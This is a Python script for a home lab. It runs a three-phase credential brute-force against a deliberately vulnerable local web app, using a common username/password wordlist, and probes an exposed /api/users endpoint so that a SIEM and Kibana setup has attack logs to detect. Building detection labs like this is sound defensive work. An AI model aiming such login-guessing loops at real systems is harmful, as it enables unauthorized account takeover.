#!/usr/bin/env python3
"""
Brute Force Testing Script for Vulnerable Web Application
This script demonstrates brute force attacks and generates logs for SIEM monitoring.
DO NOT USE AGAINST REAL SYSTEMS!
"""

import requests
import time
import random
import json
from datetime import datetime

# Target URL
BASE_URL = "http://localhost:80"

# Common usernames and passwords for testing
COMMON_USERNAMES = [
    'admin', 'user', 'test', 'demo', 'guest', 'root', 'administrator',
    'admin123', 'user123', 'test123', 'demo123', 'guest123'
]

COMMON_PASSWORDS = [
    'admin', 'password', '123456', 'admin123', 'password123', 'test123',
    'demo123', 'guest123', 'root', 'administrator', 'user', 'test',
    'password123', '123456789', 'qwerty', 'abc123', 'letmein', 'welcome'
]

# Valid credentials from the application
VALID_CREDENTIALS = {
    'admin': 'admin123',
    'user': 'password123',
    'test': 'test123',
    'demo': 'demo123',
    'guest': 'guest123'
}

def test_login(username, password):
    """Test a single login attempt"""
    try:
        response = requests.post(f"{BASE_URL}/login", 
                               data={'username': username, 'password': password},
                               timeout=10)
        
        success = "dashboard" in response.url
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {username}:{password} -> {'✅ SUCCESS' if success else '❌ FAILED'}")
        
        return success
    except Exception as e:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {username}:{password} -> ERROR: {e}")
        return False

def brute_force_attack():
    """Perform brute force attack"""
    print("🔓 Starting Brute Force Attack Simulation")
    print("=" * 50)
    
    successful_logins = []
    
    # Test 1: Try common username/password combinations
    print("\n📋 Phase 1: Common Credentials")
    for username in COMMON_USERNAMES:
        for password in COMMON_PASSWORDS:
            if test_login(username, password):
                successful_logins.append((username, password))
            time.sleep(0.5)  # Small delay to avoid overwhelming
    
    # Test 2: Try valid credentials multiple times
    print("\n📋 Phase 2: Valid Credentials (Multiple Attempts)")
    for username, password in VALID_CREDENTIALS.items():
        for i in range(3):
            if test_login(username, password):
                successful_logins.append((username, password))
            time.sleep(0.3)
    
    # Test 3: Random combinations
    print("\n📋 Phase 3: Random Combinations")
    for i in range(20):
        username = random.choice(COMMON_USERNAMES)
        password = random.choice(COMMON_PASSWORDS)
        if test_login(username, password):
            successful_logins.append((username, password))
        time.sleep(0.2)
    
    print("\n" + "=" * 50)
    print("🎯 Attack Summary:")
    print(f"Total successful logins: {len(successful_logins)}")
    
    if successful_logins:
        print("Successful credentials found:")
        for username, password in set(successful_logins):
            print(f"  - {username}:{password}")
    
    print("\n📊 Check Kibana for SIEM logs!")
    print("🌐 Kibana URL: http://localhost:5601")

def test_api_endpoint():
    """Test the vulnerable API endpoint"""
    print("\n🔍 Testing Vulnerable API Endpoint")
    print("=" * 30)
    
    try:
        response = requests.get(f"{BASE_URL}/api/users")
        if response.status_code == 200:
            data = response.json()
            print("✅ API endpoint accessible")
            print(f"📋 Exposed users: {data.get('users', [])}")
            print(f"💬 Message: {data.get('message', '')}")
        else:
            print(f"❌ API endpoint failed: {response.status_code}")
    except Exception as e:
        print(f"❌ API test error: {e}")

def test_health_endpoint():
    """Test health endpoint"""
    try:
        response = requests.get(f"{BASE_URL}/health")
        if response.status_code == 200:
            data = response.json()
            print(f"✅ Health check: {data}")
        else:
            print(f"❌ Health check failed: {response.status_code}")
    except Exception as e:
        print(f"❌ Health check error: {e}")

if __name__ == "__main__":
    print("🚀 Vulnerable Web Application - Brute Force Test")
    print("⚠️  WARNING: This is for educational purposes only!")
    print("=" * 60)
    
    # Test health first
    test_health_endpoint()
    
    # Test API endpoint
    test_api_endpoint()
    
    # Perform brute force attack
    brute_force_attack()
    
    print("\n🎉 Test completed!")
    print("📊 Check your SIEM logs in Kibana for security events") 